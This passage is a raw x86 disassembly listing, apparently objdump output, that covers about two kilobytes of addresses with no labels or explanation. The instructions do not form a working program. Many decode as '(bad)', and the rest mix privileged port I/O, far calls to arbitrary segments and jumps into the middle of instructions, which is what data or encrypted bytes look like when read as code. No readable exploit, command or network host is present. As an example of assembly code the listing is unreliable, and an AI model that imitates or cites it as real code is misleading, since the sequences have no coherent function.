  415149:	xchg   edx,eax
  41514a:	imul   ecx,DWORD PTR [edi-0x54414fec],0xf0e49211
  415154:	mov    ds:0x399e3a56,al
  415159:	jns    0x415179
  41515b:	inc    ecx
  41515c:	sub    esi,DWORD PTR [edi+0x5e5f580c]
  415162:	pop    edx
  415163:	shl    DWORD PTR [ebp-0x7f],0xfa
  415167:	mov    esi,esi
  415169:	scas   eax,DWORD PTR es:[edi]
  41516a:	and    bl,BYTE PTR [eax]
  41516c:	shl    DWORD PTR [edx-0x5d],1
  41516f:	cmp    ah,bl
  415171:	(bad)  
  415172:	scas   al,BYTE PTR es:[edi]
  415173:	inc    eax
  415174:	mov    edx,0x46bc2a9
  415179:	jb     0x4151bb
  41517b:	lea    eax,[ecx]
  41517d:	mov    cl,0x29
  41517f:	inc    esp
  415180:	add    eax,0x34cfdd90
  415185:	test   eax,0x15513f6
  41518a:	(bad)
  41518e:	(bad)  
  41518f:	clc    
  415190:	call   0xe331e250
  415195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415196:	sti    
  415197:	pushf  
  415198:	xor    BYTE PTR [esi+0x1093be92],ah
  41519e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41519f:	jnp    0x41521e
  4151a1:	and    al,0x4
  4151a3:	adc    ebx,DWORD PTR [edi-0x7a]
  4151a6:	loopne 0x4151f9
  4151a8:	adc    al,0xa8
  4151aa:	mov    ebx,ebx
  4151ac:	(bad)  
  4151ad:	ja     0x415228
  4151af:	fldenv [edx+0x30e6d877]
  4151b5:	repnz and al,0x96
  4151b8:	rcr    BYTE PTR [ecx+0x28],1
  4151bb:	add    DWORD PTR [edi],ecx
  4151bd:	mov    dl,0xfe
  4151bf:	pop    ss
  4151c0:	xchg   edi,eax
  4151c1:	fstp   st(0)
  4151c3:	adc    dl,BYTE PTR [ebx+0x539f4f2f]
  4151c9:	cmp    al,0x9e
  4151cb:	cmc    
  4151cc:	add    al,0x24
  4151ce:	(bad)  
  4151cf:	ret    0xb24e
  4151d2:	mov    ch,0xc3
  4151d4:	stos   DWORD PTR es:[edi],eax
  4151d5:	repnz inc esi
  4151d7:	(bad)  
  4151d8:	push   eax
  4151d9:	fisubr DWORD PTR [edx+0x8]
  4151dc:	shl    DWORD PTR [ebx],cl
  4151de:	in     al,dx
  4151df:	cmp    al,0x34
  4151e1:	inc    ecx
  4151e2:	dec    ecx
  4151e3:	inc    eax
  4151e4:	mov    BYTE PTR [edx],ch
  4151e6:	js     0x415232
  4151e8:	(bad)  
  4151e9:	mov    dh,0x6d
  4151eb:	lods   al,BYTE PTR ds:[esi]
  4151ec:	cmp    eax,0x525200fc
  4151f1:	jmp    FWORD PTR [edi-0x673d243a]
  4151f7:	out    dx,al
  4151f8:	jnp    0x415265
  4151fa:	pop    ebp
  4151fb:	mov    es:0x1c97f5fd,al
  415201:	or     DWORD PTR [eax+0x35],0x6a
  415205:	ins    DWORD PTR es:[edi],dx
  415206:	jae    0x4151c1
  415208:	sti    
  415209:	jne    0x415200
  41520b:	enter  0xd855,0x1b
  41520f:	(bad)  
  415210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415211:	xor    DWORD PTR [ecx+ecx*8+0x776b2be6],esi
  415218:	aaa    
  415219:	cwde   
  41521a:	test   eax,0xe8448e38
  41521f:	call   0x98a3:0xe9618db2
  415226:	std    
  415227:	arpl   WORD PTR [esi+0x1c],ax
  41522a:	and    ch,BYTE PTR [eax-0x49]
  41522d:	scas   al,BYTE PTR es:[edi]
  41522e:	not    DWORD PTR [edx-0x7]
  415231:	xor    esp,DWORD PTR [ecx+ebp*8+0x3f]
  415235:	clc    
  415236:	push   ebp
  415237:	in     al,dx
  415238:	or     ch,BYTE PTR [eax+0x64bda710]
  41523e:	and    al,0x1d
  415240:	arpl   di,cx
  415242:	adc    ch,bh
  415244:	(bad)  [ebx]
  415246:	enter  0xcd08,0x5
  41524a:	lea    edi,[esi]
  41524c:	adc    ecx,DWORD PTR [ecx-0x46]
  41524f:	xchg   ebx,eax
  415250:	lods   eax,DWORD PTR ds:[esi]
  415251:	inc    edx
  415252:	mov    edi,0xf2dde638
  415257:	and    al,0x7b
  415259:	sub    al,0xc6
  41525b:	adc    ch,BYTE PTR ss:[ebx]
  41525e:	cwde   
  41525f:	add    bh,BYTE PTR ds:0x249fdbb4
  415265:	enter  0x5d58,0x4b
  415269:	xor    BYTE PTR [edi],0xa6
  41526c:	ror    DWORD PTR [esi],1
  41526e:	pop    ss
  41526f:	pop    edi
  415270:	add    al,0xbe
  415272:	xor    BYTE PTR [ebp+0x66],ch
  415275:	out    0xa1,al
  415277:	sub    al,0x1f
  415279:	mov    esi,0x50cb50c6
  41527e:	jns    0x415279
  415280:	outs   dx,DWORD PTR ds:[esi]
  415281:	dec    edx
  415282:	mov    cl,0x3e
  415284:	push   ebx
  415285:	les    edx,FWORD PTR [edi-0xa03b50d]
  41528b:	sbb    ebx,edi
  41528d:	jecxz  0x4152e3
  41528f:	fisttp DWORD PTR [esi+0x5d5b02a7]
  415295:	jae    0x41523e
  415297:	pop    edx
  415298:	pop    edi
  415299:	arpl   sp,bp
  41529b:	leave  
  41529c:	xor    BYTE PTR [edx+0x5a],bl
  41529f:	imul   edi,esi,0x2cffb6
  4152a5:	jle    0x4152f2
  4152a7:	fxch   st(1)
  4152a9:	and    esi,ecx
  4152ab:	add    BYTE PTR [ecx-0x4bbeaf7c],0xfb
  4152b2:	mov    dh,0xbd
  4152b4:	rcl    DWORD PTR [ebp+0x1b],1
  4152b7:	(bad)  
  4152b8:	cmp    ebx,DWORD PTR [esi]
  4152ba:	cld    
  4152bb:	or     al,0x20
  4152bd:	test   al,0xb
  4152bf:	cli    
  4152c0:	lahf   
  4152c1:	je     0x4152e7
  4152c3:	jge    0x415325
  4152c5:	into   
  4152c6:	dec    ecx
  4152c7:	dec    ebx
  4152c8:	and    eax,0x45b73185
  4152cd:	pop    es
  4152ce:	loop   0x415347
  4152d0:	jb     0x4152f5
  4152d2:	and    BYTE PTR [edx],dh
  4152d4:	add    BYTE PTR [edi],ah
  4152d6:	and    BYTE PTR [eax+esi*1+0x15],bl
  4152da:	enter  0x669f,0x4d
  4152de:	popf   
  4152df:	xor    eax,0x65b77062
  4152e4:	add    bl,BYTE PTR [ecx+0x15bbcdde]
  4152ea:	mov    eax,0x32196bba
  4152ef:	loope  0x41535a
  4152f1:	pushf  
  4152f2:	mov    esp,DWORD PTR [edi-0x1cf6fff3]
  4152f8:	inc    esi
  4152fa:	sub    DWORD PTR [ecx+edx*4+0x263bc851],0x68
  415302:	dec    edx
  415303:	push   ecx
  415304:	test   al,0xa5
  415306:	in     eax,dx
  415307:	bound  eax,QWORD PTR [esi+0xf8fa2c]
  41530d:	nop
  41530e:	(bad)  
  41530f:	mov    edi,0xfc1640f1
  415314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415315:	lock jbe 0x4152b1
  415318:	mov    WORD PTR [edx],ss
  41531a:	dec    eax
  41531b:	push   edi
  41531c:	push   edi
  41531d:	data16 in al,0x50
  415320:	push   edi
  415321:	pop    edx
  415322:	enter  0x8f98,0x15
  415326:	inc    edi
  415327:	pop    edx
  415328:	or     BYTE PTR [esi],cl
  41532a:	or     ebx,ebx
  41532c:	mov    ch,0x72
  41532e:	scas   eax,DWORD PTR es:[edi]
  41532f:	push   esp
  415330:	push   esi
  415331:	or     al,0xe0
  415333:	adc    dl,dh
  415335:	shl    ebp,1
  415337:	hlt    
  415338:	dec    eax
  415339:	sbb    esp,esp
  41533b:	sub    DWORD PTR [edx+0x3f0f7aac],edx
  415341:	out    dx,eax
  415342:	test   DWORD PTR [edi],edi
  415344:	data16 sar ah,1
  415347:	stc    
  415348:	push   eax
  415349:	shr    dl,0xad
  41534c:	jl     0x41532c
  41534e:	sub    BYTE PTR ds:0x805b8708,al
  415354:	in     al,0x91
  415356:	xchg   ebx,eax
  415357:	sbb    esi,0x3b
  41535a:	sar    cl,cl
  41535c:	fmul   st(2),st
  41535e:	das    
  41535f:	dec    ebx
  415360:	jl     0x41534b
  415362:	inc    ebx
  415363:	dec    esi
  415364:	out    0x10,al
  415366:	lods   al,BYTE PTR ds:[esi]
  415367:	call   0x72eb760b
  41536c:	cld    
  41536d:	inc    eax
  41536e:	or     edi,DWORD PTR [ebx]
  415370:	adc    eax,0x455d892b
  415375:	cs imul edx,edi,0x5377e538
  41537c:	out    0x8a,al
  41537e:	jae    0x415374
  415380:	jno    0x4153bc
  415382:	popf   
  415383:	pop    esi
  415384:	cmp    al,0xe7
  415386:	jne    0x415317
  415388:	ds xor eax,0x57
  41538c:	sbb    DWORD PTR [ebp-0x72],ebp
  41538f:	push   esp
  415390:	retf   0x5c8b
  415393:	daa    
  415394:	push   eax
  415395:	ficomp WORD PTR [esi-0x2dd8f8e5]
  41539b:	outs   dx,BYTE PTR ds:[esi]
  41539c:	xor    al,0x78
  41539e:	jge    0x4153ce
  4153a0:	leave  
  4153a1:	cmp    eax,0x7f460754
  4153a6:	(bad)  
  4153a7:	aam    0x16
  4153a9:	in     eax,dx
  4153aa:	mov    eax,ds:0x3fa7f81a
  4153af:	sbb    bh,BYTE PTR [ebx-0x73]
  4153b2:	iret   
  4153b3:	cdq    
  4153b4:	hlt    
  4153b5:	mov    ah,0x36
  4153b7:	and    DWORD PTR [ecx],ebp
  4153b9:	shl    BYTE PTR [ecx+0x21cbee03],0x1c
  4153c0:	psrlw  mm5,QWORD PTR [eax-0x3b8b8dc4]
  4153c7:	pop    ecx
  4153c8:	xor    BYTE PTR [edx+edi*4],ch
  4153cb:	pushf  
  4153cc:	sbb    esp,0xf6ebc77b
  4153d2:	sbb    edx,esi
  4153d4:	in     al,0x81
  4153d6:	xchg   edi,eax
  4153d7:	adc    BYTE PTR [eax+ebp*4+0x12525929],0x3b
  4153df:	sbb    bl,bl
  4153e1:	ficomp DWORD PTR [edi]
  4153e3:	imul   edi,DWORD PTR [edx+0x6eb724b3],0x7ad853bb
  4153ed:	fs mov cl,0x4a
  4153f0:	(bad)  
  4153f1:	icebp  
  4153f2:	push   edi
  4153f3:	jnp    0x4153af
  4153f5:	test   BYTE PTR [esi-0x1bf3a4ba],al
  4153fb:	mov    bh,0xfd
  4153fd:	inc    ebx
  4153fe:	scas   al,BYTE PTR es:[edi]
  4153ff:	cmp    DWORD PTR [edx+ebx*8],edx
  415402:	add    al,0x8c
  415404:	and    BYTE PTR [eax-0x55f37f5],bh
  41540a:	xchg   ebp,eax
  41540c:	(bad)  [ebx-0x3832a480]
  415412:	test   DWORD PTR [ebp+0xf],esi
  415415:	jo     0x41544e
  415417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415418:	mov    ah,0xe5
  41541a:	cmp    DWORD PTR [esi+0x23bbbb4b],esp
  415420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415421:	icebp  
  415422:	inc    esi
  415423:	ret    0xf8f7
  415426:	imul   esi,ebx,0x2229845a
  41542c:	sti    
  41542d:	jb     0x4153cf
  41542f:	push   eax
  415430:	sub    eax,0x23f6f8bc
  415435:	xor    ah,BYTE PTR [ebx+eiz*8+0x39]
  415439:	sahf   
  41543a:	xchg   ebx,eax
  41543b:	pop    ebp
  41543c:	sbb    BYTE PTR [ecx-0x7a],dl
  41543f:	or     cl,BYTE PTR [esi-0x2b]
  415442:	sub    eax,0x2962ce5e
  415447:	xor    eax,DWORD PTR [eax-0x4d4e24b8]
  41544d:	sbb    dh,0x13
  415450:	push   ebp
  415451:	aad    0x85
  415453:	and    BYTE PTR [ebx+0xfd52874],bh
  415459:	pop    edx
  41545a:	pop    es
  41545b:	mov    ebp,DWORD PTR [edx]
  41545d:	aaa    
  41545e:	aad    0xe5
  415460:	stc    
  415461:	les    ecx,FWORD PTR ds:[ebx+0x4]
  415465:	call   0x8360f1ca
  41546a:	idiv   BYTE PTR [eax+0x5fb08f7c]
  415470:	lahf   
  415471:	pop    esp
  415472:	(bad)  
  415473:	jp     0x41541d
  415475:	inc    eax
  415476:	push   edx
  415477:	(bad)  
  415478:	hlt    
  415479:	or     ah,ch
  41547b:	stos   DWORD PTR es:[edi],eax
  41547c:	dec    ebx
  41547d:	pop    ss
  41547e:	and    edx,esp
  415480:	jmp    0x558a6596
  415485:	hlt    
  415486:	pop    ss
  415487:	sbb    ebx,edi
  415489:	add    eax,0x617abf0b
  41548e:	and    esp,DWORD PTR [esi]
  415490:	(bad)  
  415492:	inc    edx
  415493:	pusha  
  415494:	shl    BYTE PTR ds:0xe106010b,cl
  41549a:	jbe    0x415431
  41549c:	xchg   ecx,eax
  41549d:	imul   eax,eax,0xc7d6312c
  4154a3:	sub    DWORD PTR [edx+0xf],0x97bdd044
  4154aa:	mov    esp,0x144e620c
  4154af:	or     dl,BYTE PTR [esi+0x7be0e7ea]
  4154b5:	fsub   st,st(2)
  4154b7:	sbb    ch,BYTE PTR [edx-0xd]
  4154ba:	sub    eax,0xd8756b04
  4154bf:	adc    al,BYTE PTR cs:[esi-0x6381806c]
  4154c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154c7:	mov    esi,eax
  4154c9:	repnz push edi
  4154cb:	inc    edi
  4154cc:	jae    0x415534
  4154ce:	mov    ch,0x38
  4154d0:	pop    es
  4154d1:	(bad)  
  4154d2:	pop    ecx
  4154d3:	rcl    edi,0xfe
  4154d6:	mov    ecx,0x7f807987
  4154db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154dc:	nop
  4154dd:	sub    al,0x6d
  4154df:	fs loope 0x4154e6
  4154e2:	jo     0x41548a
  4154e4:	outs   dx,BYTE PTR ds:[esi]
  4154e5:	fwait
  4154e6:	je     0x4154f0
  4154e8:	push   ebx
  4154e9:	push   ebx
  4154ea:	outs   dx,BYTE PTR ds:[esi]
  4154eb:	sbb    dl,BYTE PTR [esi]
  4154ed:	outs   dx,BYTE PTR ds:[esi]
  4154ee:	pop    ebp
  4154ef:	int    0x54
  4154f1:	sub    dl,BYTE PTR [eax-0x5d1cd104]
  4154f7:	lahf   
  4154f8:	div    BYTE PTR [ebp+0x5fac6e1c]
  4154fe:	in     eax,dx
  4154ff:	dec    ecx
  415500:	mov    edx,0x4b46b086
  415505:	ret    0xc886
  415508:	mov    ch,BYTE PTR [esi+0x43]
  41550b:	addr16 xor al,0x34
  41550e:	mov    DWORD PTR [ecx],esi
  415510:	int    0x82
  415512:	test   DWORD PTR [ebp-0x6a6fb350],esi
  415518:	mov    bl,dh
  41551a:	sub    edi,edi
  41551c:	imul   eax,DWORD PTR es:[esi+ecx*1+0xd],0xcef6131f
  415525:	inc    edx
  415526:	scas   al,BYTE PTR es:[edi]
  415527:	cmp    dl,BYTE PTR [esi]
  415529:	pop    ebx
  41552a:	xor    dh,BYTE PTR [eax]
  41552c:	arpl   WORD PTR [eax],bp
  41552e:	inc    ebx
  41552f:	nop
  415530:	pop    esi
  415531:	fs xchg ebp,eax
  415533:	repnz arpl sp,bx
  415536:	inc    edx
  415537:	ror    DWORD PTR [ebx-0x59acb297],cl
  41553d:	sub    eax,DWORD PTR [ebp+0x7d]
  415540:	out    0xa1,al
  415542:	nop
  415543:	aaa    
  415544:	scas   eax,DWORD PTR es:[edi]
  415545:	pop    es
  415546:	mov    eax,0x2b5d75bc
  41554b:	nop
  41554c:	pop    eax
  41554d:	lds    ecx,FWORD PTR [ecx+0x79]
  415550:	rcr    BYTE PTR [eax],cl
  415552:	popa   
  415553:	gs sub cl,al
  415556:	xlat   BYTE PTR ds:[ebx]
  415557:	enter  0x3205,0x41
  41555b:	stos   DWORD PTR es:[edi],eax
  41555c:	jns    0x4155ce
  41555e:	in     al,0xdb
  415560:	push   es
  415561:	jg     0x4155ca
  415563:	fdiv   DWORD PTR [ecx]
  415565:	xor    al,0x12
  415567:	and    eax,0x88a5bb23
  41556c:	push   ebx
  41556d:	ins    DWORD PTR es:[edi],dx
  41556e:	hlt    
  41556f:	pop    eax
  415570:	loop   0x415533
  415572:	mov    ch,0x59
  415574:	add    ch,BYTE PTR [edx+0x33]
  415577:	add    eax,0xa0d1f1a5
  41557c:	(bad)  
  41557d:	pusha  
  41557e:	push   esp
  41557f:	out    0xb8,eax
  415581:	mov    ch,0xb4
  415583:	mov    bh,0x4b
  415585:	pop    ds
  415586:	cmp    al,0x33
  415588:	rcl    BYTE PTR gs:[edi-0x6ac48bbf],0xf3
  415590:	or     eax,0x7411a79
  415595:	dec    edx
  415596:	ss popa 
  415598:	cmp    cl,BYTE PTR [ebx-0x6d]
  41559b:	push   edx
  41559c:	push   es
  41559d:	cmp    DWORD PTR [ecx],0x62f48a63
  4155a3:	repnz out 0x26,al
  4155a6:	push   edi
  4155a7:	mov    bh,0x33
  4155a9:	sbb    BYTE PTR [edi+0x2fd5fc2d],al
  4155af:	int    0x75
  4155b1:	mov    dh,0x28
  4155b3:	sbb    WORD PTR [edx-0x15],cx
  4155b7:	adc    ch,al
  4155b9:	call   0x975b:0xff7cbb86
  4155c0:	sbb    al,0x1e
  4155c2:	mov    al,0x85
  4155c4:	mov    al,ds:0xc99461ce
  4155c9:	xor    eax,0xa8b0ec07
  4155ce:	fwait
  4155cf:	sbb    ah,BYTE PTR [eax]
  4155d1:	dec    esi
  4155d2:	and    bl,cl
  4155d4:	dec    ebp
  4155d5:	and    al,BYTE PTR [edi-0x3a]
  4155d8:	dec    edi
  4155d9:	xlat   BYTE PTR ds:[ebx]
  4155da:	or     DWORD PTR [esi+0x7334fb32],0x58
  4155e1:	push   ecx
  4155e2:	and    DWORD PTR [edx+0x43],eax
  4155e5:	and    ah,BYTE PTR [esi-0x378dbddf]
  4155eb:	or     al,0x94
  4155ed:	and    DWORD PTR [edx-0x52],esi
  4155f0:	xor    eax,0x6d84f045
  4155f5:	mov    es,WORD PTR [edi+edi*4+0x1f]
  4155f9:	pop    edi
  4155fa:	(bad)  
  4155fb:	mov    dl,0xc3
  4155fd:	cmp    ch,BYTE PTR [ecx-0x37]
  415600:	and    dh,BYTE PTR [eax+edi*8+0x40]
  415604:	int3   
  415605:	xchg   DWORD PTR [ebx+0x43],eax
  415608:	cmp    edx,DWORD PTR [ecx]
  41560a:	sbb    ebx,0x7b
  41560d:	push   edi
  41560e:	mov    eax,ds:0x4db8e9b5
  415613:	inc    ebx
  415614:	dec    esp
  415615:	loope  0x41559d
  415617:	ja     0x415650
  415619:	retf   0x49e5
  41561c:	nop
  41561d:	out    0xb3,al
  41561f:	stos   DWORD PTR es:[edi],eax
  415620:	pop    eax
  415621:	int3   
  415622:	outs   dx,BYTE PTR ds:[esi]
  415623:	fxch   st(2)
  415625:	add    dl,BYTE PTR [esi+eiz*2+0x62]
  415629:	and    cl,bl
  41562b:	adc    DWORD PTR ds:0x2df66cee,ebp
  415631:	cmp    al,0x58
  415633:	test   eax,0xd30e4ea3
  415638:	mov    ebx,0x4f5e705
  41563d:	test   BYTE PTR ds:0xde738a2a,0x68
  415644:	rcl    ah,0x3f
  415647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415648:	outs   dx,BYTE PTR ds:[esi]
  415649:	mov    DWORD PTR ds:0x60bde904,edi
  41564f:	out    dx,eax
  415650:	cmp    bl,BYTE PTR [edx+0x31]
  415653:	and    bl,BYTE PTR [edi]
  415655:	sub    eax,0xd5146c1a
  41565a:	mov    gs,WORD PTR [esp+eiz*2-0xe24030b]
  415661:	cmovge esp,ecx
  415664:	les    esi,FWORD PTR [ecx+ebp*8-0x4314bf45]
  41566b:	xlat   BYTE PTR ds:[ebx]
  41566c:	mul    DWORD PTR [esi-0x27]
  41566f:	lock xchg esi,eax
  415671:	push   ebp
  415672:	shr    bh,1
  415674:	into   
  415675:	shl    ebx,1
  415677:	aaa    
  415678:	mov    ebp,0x6c63c83a
  41567d:	(bad)  
  41567e:	out    0x42,eax
  415680:	sbb    DWORD PTR [edi],ebp
  415682:	mov    ds:0xe7d7bf04,al
  415687:	das    
  415688:	xor    eax,0xda585b46
  41568d:	cmp    edi,DWORD PTR [ecx-0x5b]
  415690:	push   esi
  415691:	dec    edx
  415692:	daa    
  415693:	fstp   QWORD PTR [edx-0x1d]
  415696:	stos   DWORD PTR es:[edi],eax
  415697:	inc    edi
  415698:	push   0x2cf50677
  41569d:	sbb    esi,DWORD PTR [edx+edx*2+0x5b1261bb]
  4156a4:	dec    ebp
  4156a5:	and    al,0x40
  4156a7:	pop    esp
  4156a8:	sbb    al,0x9
  4156aa:	sbb    ch,al
  4156ac:	aaa    
  4156ad:	cmp    BYTE PTR ds:0xb59c694f,ah
  4156b3:	rol    ecx,0xc2
  4156b6:	mov    BYTE PTR [ebp-0x55],0x17
  4156ba:	xchg   esp,eax
  4156bb:	dec    edi
  4156bc:	xchg   ebp,eax
  4156bd:	iret   
  4156be:	pop    ds
  4156bf:	jecxz  0x415651
  4156c1:	adc    esi,ebx
  4156c3:	dec    ebp
  4156c4:	jp     0x415722
  4156c6:	test   al,0x8a
  4156c8:	xor    eax,0x1f952542
  4156cd:	clc    
  4156ce:	dec    ecx
  4156cf:	aas    
  4156d0:	(bad)  
  4156d1:	or     esi,DWORD PTR [eax+0x3d]
  4156d4:	sbb    BYTE PTR [ecx+edi*2],bl
  4156d7:	lods   al,BYTE PTR ds:[esi]
  4156d8:	sti    
  4156d9:	sbb    ebx,0x5e
  4156dc:	call   0x8e74:0xfbc3b387
  4156e3:	and    eax,0xcbad33cc
  4156e8:	mov    al,0x7f
  4156ea:	cli    
  4156eb:	push   ecx
  4156ec:	mov    dl,ah
  4156ee:	test   al,0x1
  4156f0:	add    cl,BYTE PTR [edi-0x5b]
  4156f3:	mov    ah,0x7b
  4156f5:	pop    es
  4156f6:	push   ebx
  4156f7:	lock stos BYTE PTR es:[edi],al
  4156f9:	(bad)  
  4156fb:	aas    
  4156fc:	popf   
  4156fd:	sub    BYTE PTR [ecx+0x4aa930b1],dl
  415703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415704:	sub    edx,ebx
  415706:	lods   eax,DWORD PTR ds:[esi]
  415707:	popa   
  415708:	int    0xc6
  41570a:	or     BYTE PTR [edi+0x6a017f2d],ch
  415710:	sbb    DWORD PTR [eax+0x28],edx
  415713:	inc    edi
  415714:	aam    0xe8
  415716:	dec    ebp
  415717:	xor    eax,0xfd105f5a
  41571c:	push   es
  41571d:	add    DWORD PTR [edi-0x504fa34a],edi
  415723:	adc    bl,BYTE PTR [ebp-0x7e6fc0a8]
  415729:	push   edi
  41572a:	add    ecx,DWORD PTR ds:0xe0d136ae
  415730:	rcr    BYTE PTR [ecx],0x8b
  415733:	sbb    ch,BYTE PTR [esi-0x71fc2079]
  415739:	xchg   ebx,eax
  41573a:	out    dx,al
  41573b:	dec    esi
  41573c:	hlt    
  41573d:	mov    ds:0xb406d94,al
  415742:	mov    eax,?
  415744:	jnp    0x4156d9
  415746:	call   FWORD PTR [esi]
  415748:	fldcw  WORD PTR [esi]
  41574a:	rcpps  xmm6,xmm0
  41574d:	loopne 0x41575e
  41574f:	mov    al,ds:0xdfae78d1
  415754:	js     0x415707
  415756:	inc    esi
  415757:	and    DWORD PTR [ebp+0x37],eax
  41575a:	arpl   WORD PTR [edx-0x54],ax
  41575d:	lods   al,BYTE PTR cs:[esi]
  41575f:	sbb    DWORD PTR [ebp+0x3bfb47a5],esp
  415765:	push   ebx
  415766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415767:	iret   
  415768:	cmp    DWORD PTR [esi+edi*1+0x7b],eax
  41576c:	repz cwde 
  41576e:	inc    esp
  41576f:	iret   
  415770:	xor    al,0x30
  415772:	mov    eax,0x5453e9be
  415777:	adc    al,0x16
  415779:	in     eax,0xa8
  41577b:	test   bh,ch
  41577d:	or     bl,bl
  41577f:	mov    eax,ds:0xbd0b1346
  415784:	std    
  415785:	idiv   esp
  415787:	and    ah,al
  415789:	mov    ebp,0xf846303b
  41578e:	retf   
  41578f:	sti    
  415790:	jg     0x4157f5
  415792:	and    BYTE PTR [eax+0x4dfb09c6],ah
  415798:	xlat   BYTE PTR ds:[ebx]
  415799:	pop    eax
  41579a:	iret   
  41579b:	rol    BYTE PTR [edi-0x2b],0x6
  41579f:	ss pop esi
  4157a1:	and    edx,ecx
  4157a3:	dec    edx
  4157a4:	sub    al,0xf7
  4157a6:	mov    al,0xeb
  4157a8:	clc    
  4157a9:	jge    0x415810
  4157ab:	jmp    0x3261348a
  4157b0:	add    cl,ch
  4157b2:	popa   
  4157b3:	jp     0x415793
  4157b5:	dec    eax
  4157b6:	shl    DWORD PTR ds:[edx+edi*1-0x38713f08],cl
  4157be:	clc    
  4157bf:	mov    ebp,0x69c590c6
  4157c4:	iret   
  4157c5:	cmc    
  4157c6:	mov    bh,0xc4
  4157c8:	sub    ebx,ebp
  4157ca:	xchg   edi,eax
  4157cb:	jl     0x4157ce
  4157cd:	dec    ebx
  4157ce:	cmc    
  4157cf:	add    ecx,DWORD PTR [edx]
  4157d1:	xor    BYTE PTR [ebx+0x4f],cl
  4157d4:	push   edi
  4157d5:	jle    0x415838
  4157d7:	mov    al,0x88
  4157d9:	push   edi
  4157da:	jle    0x415848
  4157dc:	adc    BYTE PTR [eax],cl
  4157de:	cmp    ah,al
  4157e0:	pop    ss
  4157e1:	dec    ebx
  4157e2:	pop    es
  4157e3:	and    al,0x4a
  4157e5:	cmp    eax,0x69c2e8a4
  4157ea:	ficom  WORD PTR gs:[ecx]
  4157ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157ee:	fwait
  4157ef:	mov    eax,ds:0xb3c37533
  4157f4:	sub    esi,DWORD PTR [ecx-0x6c]
  4157f7:	jb     0x415822
  4157f9:	sbb    ebp,DWORD PTR [ecx+ebx*4-0x2b32388d]
  415800:	outs   dx,DWORD PTR ds:[esi]
  415801:	jmp    0x41584e
  415803:	mov    ?,WORD PTR ds:0x2e98cf77
  415809:	jecxz  0x4157c4
  41580b:	popa   
  41580c:	pop    ds
  41580d:	adc    esp,DWORD PTR [edx+esi*1+0x50f79e2a]
  415814:	dec    ebx
  415815:	addr16 loope 0x4157c8
  415818:	fcmovnbe st,st(6)
  41581a:	std    
  41581b:	xor    eax,DWORD PTR [ebx+0x63859672]
  415821:	mov    ah,0xb3
  415823:	out    dx,al
  415824:	sub    eax,0x21657def
  415829:	fld    QWORD PTR [edi+0x42]
  41582c:	stc    
  41582d:	push   ebp
  41582e:	sub    BYTE PTR [ecx+0x796b791b],ch
  415834:	shl    DWORD PTR [edi],cl
  415836:	mov    dl,BYTE PTR [ebp+0x31]
  415839:	sbb    ah,BYTE PTR [edi]
  41583b:	push   edi
  41583c:	xchg   ecx,eax
  41583d:	(bad)  
  41583e:	rcl    DWORD PTR [eax+edi*2+0x85df7d6],cl
  415845:	mov    BYTE PTR [ecx],bh
  415847:	xchg   ecx,eax
  415848:	mov    DWORD PTR [ecx+0x7fc7c0a2],ecx
  41584e:	mov    ds:0x5ae8f30f,al
  415853:	ins    BYTE PTR es:[edi],dx
  415854:	repnz iret 
  415856:	test   cl,al
  415858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415859:	ds push eax
  41585b:	push   esi
  41585c:	sbb    al,0x90
  41585f:	xchg   edx,eax
  415860:	xor    ah,BYTE PTR [edx]
  415862:	add    eax,0x7112ef70
  415867:	adc    DWORD PTR [ebx*2+0x362e91a0],esp
  41586e:	and    eax,0xf19eeb2b
  415873:	adc    BYTE PTR [edx+0x685744eb],ah
  415879:	outs   dx,DWORD PTR ds:[esi]
  41587a:	cli    
  41587b:	aam    0x31
  41587d:	ins    BYTE PTR es:[edi],dx
  41587e:	out    0xbf,al
  415880:	ins    BYTE PTR es:[edi],dx
  415881:	xor    DWORD PTR [esi+0x79],ebp
  415884:	fwait
  415885:	mov    DWORD PTR [edx-0x58223934],0xb46dcb98
  41588f:	arpl   WORD PTR es:[esi+0x76],si
  415893:	stos   DWORD PTR es:[edi],eax
  415894:	push   ss
  415895:	mov    ebp,0x70d635fc
  41589a:	or     dh,0x66
  41589d:	aaa    
  41589e:	dec    ecx
  41589f:	jbe    0x41582d
  4158a1:	mov    ds,WORD PTR [ebx+0x3c]
  4158a4:	sti    
  4158a5:	cli    
  4158a6:	pop    ebx
  4158a7:	pmulhw mm6,QWORD PTR [ecx-0x37]
  4158ab:	stos   DWORD PTR es:[edi],eax
  4158ac:	out    dx,eax
  4158ad:	lea    edx,[esp+ebp*2-0x1ddbe77f]
  4158b4:	or     dh,BYTE PTR [eax-0x7f2036ca]
  4158ba:	or     eax,0xffdc1814
  4158bf:	ins    BYTE PTR es:[edi],dx
  4158c0:	add    bh,BYTE PTR [ebx]
  4158c2:	xchg   esp,eax
  4158c3:	not    BYTE PTR [edx]
  4158c5:	out    0x74,eax
  4158c7:	js     0x4158aa
  4158c9:	test   DWORD PTR [esi+0x1],0xfae79077
  4158d0:	sti    
  4158d1:	jbe    0x41590c
  4158d3:	add    al,0xc4
  4158d5:	cmp    bh,BYTE PTR [edx]
  4158d7:	sub    BYTE PTR [ebx+0x6bdde558],dl
  4158dd:	dec    esi
  4158de:	data16 jne 0x4158fe
  4158e1:	arpl   WORD PTR [edi-0x79],si
  4158e4:	push   ebp
  4158e5:	fidivr DWORD PTR [ecx]
  4158e7:	pop    ebx
  4158e8:	out    dx,al
  4158e9:	inc    edx
  4158ea:	loopne 0x41587f
  4158ec:	shl    edx,1
  4158ee:	sbb    ch,BYTE PTR [eax+0x46fb6f07]
  4158f4:	and    BYTE PTR [ebx+0x63],0x75
  4158f8:	aam    0xfd
  4158fa:	out    dx,al
  4158fb:	xor    BYTE PTR [ebp+0x51],bl
  4158fe:	push   esi
